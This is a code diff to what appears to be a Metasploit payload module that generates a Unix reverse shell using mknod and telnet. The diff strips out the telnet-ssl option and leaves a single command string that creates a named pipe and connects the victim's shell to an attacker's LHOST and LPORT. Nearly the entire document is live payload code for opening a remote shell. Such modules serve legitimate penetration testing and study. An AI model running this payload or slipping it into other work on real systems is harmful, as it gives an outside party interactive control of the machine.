@@ -26,7 +26,7 @@ module Metasploit3
 			'Description'   => %q{
 				Creates an interactive shell via mknod and telnet.
 				This method works on Debian and other systems compiled
-				without /dev/tcp support. Telnet-ssl support included.
+				without /dev/tcp support. 
 				},
 			'Author'        => 'RageLtMan',
 			'License'       => MSF_LICENSE,
@@ -57,10 +57,6 @@ module Metasploit3
 	#
 	def command_string
 		pipe_name = Rex::Text.rand_text_alpha( rand(4) + 8 )
-		if datastore['SSLHandler']
-			cmd = "mknod #{pipe_name} p && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
-		else
-			cmd = "mknod #{pipe_name} p && telnet #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
-		end
+		cmd = "mknod #{pipe_name} p && telnet #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
 	end
 end
